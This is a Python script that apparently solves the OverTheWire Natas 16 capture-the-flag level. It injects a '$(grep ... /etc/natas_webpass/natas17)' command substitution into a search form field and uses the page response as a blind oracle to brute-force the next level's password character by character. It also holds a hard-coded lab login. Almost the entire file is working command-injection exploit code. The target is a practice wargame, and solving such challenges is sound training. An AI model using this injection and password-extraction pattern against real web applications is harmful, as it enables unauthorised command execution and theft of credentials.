import requests
from requests.auth import HTTPBasicAuth
import string

def inject(dat):
    auth = HTTPBasicAuth('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
    r = requests.post('http://natas16.natas.labs.overthewire.org/', auth=auth, data=dat)
    webcontent = r.text
    return webcontent
def check_empty(webcontent):
    if webcontent.find('bushelled') == -1:
        return True
    else:
        return False
if __name__ == "__main__":
    alphabet = string.digits + string.ascii_lowercase + string.ascii_uppercase
    cused = ''
    for l in alphabet:
        idekatthispoint = {'needle':'$(grep ' + l + ' /etc/natas_webpass/natas17)Hell', 'submit':'Search'}
        print("Characters Used: " + cused)
        out = inject(idekatthispoint)
        if check_empty(out) == True:
            cused += l
    bruteforce_chars = cused
    solution = ''
    for i in range(32):
        check = 0
        count = 0
        while check == 0:
            print('Trying: ' + cused[count] + ' ' + 'Pass: ' +  solution)
            l = cused[count]
            count += 1
            if check_empty(inject({'needle':'$(grep ^' + solution + l + ' /etc/natas_webpass/natas17)Hell', 'submit':'Search'})) == True:
                check = 1
                solution += l
    print(solution)
            
